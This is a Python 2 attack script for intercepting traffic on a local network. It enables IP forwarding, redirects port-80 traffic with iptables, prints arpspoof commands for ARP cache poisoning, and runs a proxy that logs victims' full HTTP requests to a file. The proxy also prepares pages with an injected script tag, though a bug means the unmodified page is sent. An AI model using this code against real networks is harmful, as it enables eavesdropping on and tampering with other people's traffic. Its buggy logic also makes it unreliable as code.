#!/usr/bin/python2
import os,sys,time,urllib2,thread,socket
print("Setting up iptables and starting arpspoof")
os.system('echo 1 > /proc/sys//net/ipv4/ip_forward')
os.system('cat /proc/sys/net/ipv4/ip_forward')
os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080')
print '''use arpspoof to trick the data link layer into storing you as the router '''
print '''arpspoof -i wlan0 127.0.0.1 127.0.0.1
arpspoof -i wlan0 127.0.0.1 127.0.0.1 '''



MAX_BYTES = 999999

def main():
    host = '' 
    port = 8080
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host,port))
    s.listen(50)

    while True:
        conn,client = s.accept()
        thread.start_new_thread(threading, (conn,client))

    s.close()
def threading(conn,client):
    try:
        request = conn.recv(MAX_BYTES)
        print(request)
        f = open('log.log','w')
        f.write(request)
        f.close()
        f = open('http.log','a')
        f.write(request)
        f.close()
        userAgent = os.system('cat log.log |grep User-Agent > uAgent.log')
        r = open('uAgent.log','r')
        userAgent = r.read()
        if 'Android' not in userAgent:

            if 'CONNECT' in request:
                http_req = os.system('cat log.log |grep CONNECT > url.log')
                r = open('url.log','r')
                uri = r.read()
                ur = uri.split('CONNECT ',1)[-1]
                url = ur.split('HTTP',1)[0]
           
            elif 'GET' in request:
                http_req = os.system('cat log.log |grep GET >url.log')
                r = open('url.log','r')
                uri = r.read()
                ur = uri.split('GET ', 1)[-1]
                url = ur.split('HTTP', 1)[0]
        
        elif 'Android' in userAgent:
            http_req = os.system('cat log.log |grep Host: > url.log')
            r = open('url.log','r')
            uri = r.read()
            url = uri.split('Host: ',1)[-1]

        if 'http' not in url:
            http = 'http://'
            url = http+url
        elif '443' in url:
           conn.close()
           main()
            # http = 'https://'
          #  url = http+url

        if 'google' in url:
            print('found the url contained google')
            main()

        print url
        page = urllib2.urlopen(url)
        
        #print("SENDING PAYLOADS")
        #print('THE UIFORM RESOURCE LOCATOR IS !-->', url)
        pay = page.read()
        payload = pay.replace('</body>', '<script>alert("THIS IS THE PAYLOAD")</script></body>')
        conn.send(pay)
        conn.close()
        exit
      
    except KeyboardInterrupt:
        print("keyboard interrupt")
        conn.close()
        r.close()
        exit()


if __name__ == '__main__':

    main()
